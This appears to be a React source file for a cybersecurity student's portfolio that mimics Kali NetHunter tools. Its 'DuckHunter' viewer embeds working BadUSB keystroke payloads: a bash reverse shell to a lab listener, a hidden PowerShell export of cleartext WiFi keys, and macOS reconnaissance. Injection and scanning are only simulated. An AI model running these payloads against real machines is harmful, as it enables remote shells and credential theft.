import React, { useState } from 'react';
import { useSystemContext, NetHunterPayload } from './state';
import { Icon, KaliDragonIcon } from './Icon';

export const DEFAULT_NETHUNTER_PAYLOADS: NetHunterPayload[] = [
  {
    id: 'payload-rev-shell',
    title: 'DuckHunter: POSIX Reverse Shell (Bash)',
    targetOs: 'Linux / Unix',
    description: 'Silently launches a headless background bash reverse shell to operator listener.',
    script: `REM Kali NetHunter BadUSB Keystroke Payload
REM Target: Linux / X11 / Wayland Desktop
DELAY 1000
CTRL-ALT t
DELAY 400
STRING nohup bash -c 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1' > /dev/null 2>&1 &
ENTER
DELAY 200
STRING exit
ENTER`
  },
  {
    id: 'payload-wifi-creds',
    title: 'DuckHunter: Export Stored WiFi Profiles & Keys',
    targetOs: 'Windows 10/11',
    description: 'Dumps all cleartext WPA2/WPA3 enterprise and personal WiFi profiles.',
    script: `REM Kali NetHunter Keystroke Injection
REM Target: Windows PowerShell Execution
DELAY 800
GUI r
DELAY 300
STRING powershell -NoP -NonI -W Hidden "netsh wlan export profile key=clear folder=$env:TEMP"
ENTER`
  },
  {
    id: 'payload-recon-triage',
    title: 'DuckHunter: Rapid Host Reconnaissance Manifest',
    targetOs: 'macOS / Darwin',
    description: 'Extracts hardware uuid, listening network sockets, and current users.',
    script: `REM Kali NetHunter Keystroke Injection
REM Target: macOS Terminal
DELAY 1000
GUI SPACE
DELAY 200
STRING Terminal
ENTER
DELAY 500
STRING uname -a; whoami; ifconfig en0; lsof -i -P -n | grep LISTEN
ENTER`
  }
];

export function DuckHunterBadUsbApp() {
  const s = useSystemContext();
  const payloads: NetHunterPayload[] = s.config?.netHunter?.payloads || DEFAULT_NETHUNTER_PAYLOADS;
  const [selectedId, setSelectedId] = useState(payloads[0]?.id || '');
  const [copied, setCopied] = useState(false);
  const [injected, setInjected] = useState(false);

  const currentPayload = payloads.find(p => p.id === selectedId) || payloads[0];

  const handleCopy = () => {
    navigator.clipboard.writeText(currentPayload.script);
    setCopied(true);
    s.notify('DuckyScript copied to clipboard');
    setTimeout(() => setCopied(false), 2000);
  };

  const handleInject = () => {
    setInjected(true);
    s.notify('Simulating USB HID Keystroke Injection...');
    setTimeout(() => {
      setInjected(false);
      s.notify('Payload successfully transmitted via USB HID interface.');
    }, 1500);
  };

  return (
    <div className="nethunter-tool-screen app-scroll">
      <header className="nethunter-tool-header">
        <div className="nethunter-chip-badge">
          <Icon name="bolt" size={16} />
          <span>NetHunter HID Arsenal</span>
        </div>
        <h2>DuckHunter (BadUSB Studio)</h2>
        <p>Tactical Keystroke Injection & DuckyScript Payload Crafter</p>
      </header>

      {/* Preset Selector */}
      <div className="payload-selector-row">
        {payloads.map(p => (
          <button
            key={p.id}
            className={`payload-tab-btn ${selectedId === p.id ? 'active' : ''}`}
            onClick={() => setSelectedId(p.id)}
          >
            <span>{p.targetOs}</span>
            <strong>{p.title.replace('DuckHunter: ', '')}</strong>
          </button>
        ))}
      </div>

      {/* Payload Editor Card */}
      <article className="payload-editor-card">
        <div className="payload-meta-row">
          <div>
            <h3>{currentPayload.title}</h3>
            <p>{currentPayload.description}</p>
          </div>

          <div className="payload-card-actions">
            <button className="tactical-pill-btn" onClick={handleCopy}>
              {copied ? 'Copied!' : 'Copy Script'}
            </button>
            <button className="tactical-pill-btn primary" onClick={handleInject} disabled={injected}>
              {injected ? 'Injecting...' : 'Inject HID ⚡'}
            </button>
          </div>
        </div>

        <div className="ducky-script-block">
          <div className="ducky-bar">
            <span>DuckyScript Syntax v2</span>
            <span>USB OTG Ready</span>
          </div>
          <pre className="ducky-pre">
            <code>{currentPayload.script}</code>
          </pre>
        </div>
      </article>
    </div>
  );
}

export function SubnetRadarApp() {
  const s = useSystemContext();
  const [scanning, setScanning] = useState(false);
  const [activeHost, setActiveHost] = useState<number | null>(0);

  const hosts = [
    { ip: '10.10.14.1', hostname: 'gateway.lab', os: 'Linux 6.8', ports: [22, 53, 443], status: 'Up (0.1ms)' },
    { ip: '10.10.14.22', hostname: 'zak-operator.lab', os: 'Kali Rolling (NetHunter)', ports: [22, 4444, 8080], status: 'Self (0.0ms)' },
    { ip: '10.10.14.50', hostname: 'ad-primary-dc.lab', os: 'Windows Server 2022', ports: [88, 135, 389, 445], status: 'Up (0.4ms)' },
    { ip: '10.10.14.105', hostname: 'fintech-api.lab', os: 'Ubuntu 24.04 (Docker)', ports: [80, 443, 3000], status: 'Up (0.3ms)' }
  ];

  const handleScan = () => {
    setScanning(true);
    s.notify('Scanning subnet 10.10.14.0/24 with ARP & SYN sweep...');
    setTimeout(() => {
      setScanning(false);
      s.notify('Subnet scan complete: 4 active hosts discovered.');
    }, 1200);
  };

  return (
    <div className="nethunter-tool-screen app-scroll">
      <header className="nethunter-tool-header">
        <div className="nethunter-chip-badge">
          <Icon name="wifi" size={16} />
          <span>wlan0mon · RF Active</span>
        </div>
        <h2>Subnet & Port Radar</h2>
        <p>Mobile Nmap and ARP Reconnaissance Suite</p>
      </header>

      <div className="radar-action-bar">
        <span className="radar-status-text">
          {scanning ? 'SWEEPING SUBNET 10.10.14.0/24...' : 'SUBNET: 10.10.14.0/24 (4 HOSTS ONLINE)'}
        </span>
        <button className="tactical-pill-btn primary" onClick={handleScan} disabled={scanning}>
          {scanning ? 'Scanning…' : 'Scan Subnet ↺'}
        </button>
      </div>

      <div className="radar-hosts-list">
        {hosts.map((h, i) => (
          <div
            key={i}
            className={`radar-host-card ${activeHost === i ? 'selected' : ''}`}
            onClick={() => setActiveHost(i)}
          >
            <div className="host-top">
              <code>{h.ip}</code>
              <span className="host-status">{h.status}</span>
            </div>
            <strong>{h.hostname}</strong>
            <small>{h.os}</small>
            <div className="host-ports-pills">
              {h.ports.map(p => (
                <span key={p} className="port-pill">:{p}</span>
              ))}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

export function RecruiterFastPassCard() {
  const s = useSystemContext();
  const resume = s.config?.recruiter?.resumeUrl || s.config?.widgets?.about?.resumeUrl;

  return (
    <article className="recruiter-fastpass-card">
      <div className="fastpass-badge-row">
        <span className="fastpass-pill">⚡ 60-SECOND RECRUITER BRIEF</span>
        <span className="fastpass-status">🟢 OPEN FOR ROLES</span>
      </div>

      <div className="fastpass-hero">
        <div className="fastpass-avatar">ZO</div>
        <div>
          <h2>Zakarya Oukil</h2>
          <p>MSc Candidate in Cybersecurity · eJPT Certified · BTL1 SOC Analyst</p>
        </div>
      </div>

      <div className="fastpass-pills-row">
        <span className="fastpass-tag">Offensive Security (eJPT)</span>
        <span className="fastpass-tag">Defensive SOC (BTL1)</span>
        <span className="fastpass-tag">Linux Kernel & eBPF</span>
        <span className="fastpass-tag">Adversarial ML Evasion</span>
      </div>

      <p className="fastpass-summary">
        Specializing in zero-trust architectures, real-world penetration testing, in-depth threat hunting, and high-concurrency systems. Dual-hat operator fluent in both exploit chains and defensive detection engineering.
      </p>

      <div className="fastpass-actions">
        {resume ? (
          <a href={resume} target="_blank" rel="noreferrer" className="fastpass-btn primary" download>
            <Icon name="arrow" size={16} />
            <span>Download Resume PDF</span>
          </a>
        ) : (
          <button className="fastpass-btn primary" onClick={() => s.open('about')}>
            <Icon name="arrow" size={16} />
            <span>View Dossier & CV</span>
          </button>
        )}

        <button className="fastpass-btn secondary" onClick={() => s.open('mail')}>
          <Icon name="mail" size={16} />
          <span>Contact Zakarya</span>
        </button>
      </div>
    </article>
  );
}
